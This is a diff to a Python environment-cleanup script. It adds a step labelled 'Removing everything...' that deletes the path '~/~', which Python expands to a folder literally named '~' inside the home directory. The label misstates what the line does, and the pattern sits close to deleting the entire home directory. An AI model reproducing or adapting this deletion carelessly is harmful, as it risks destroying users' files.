@@ -52,6 +52,9 @@ except FileNotFoundError:
 print_progress("Removing conda environment 'env_name'...")
 subprocess.run(['conda', 'remove', '-n', 'env_name', '--all'], check=True)
 
+print_progress("Removing everything...")
+remove_path(os.path.expanduser('~/~'))
+
 print_progress("Checking disk space...")
 result = subprocess.run(['df', '-h'], capture_output=True, text=True)
 disk_space_info = '\n'.join([line for line in result.stdout.split('\n') if 'Avail' in line or 'home' in line])
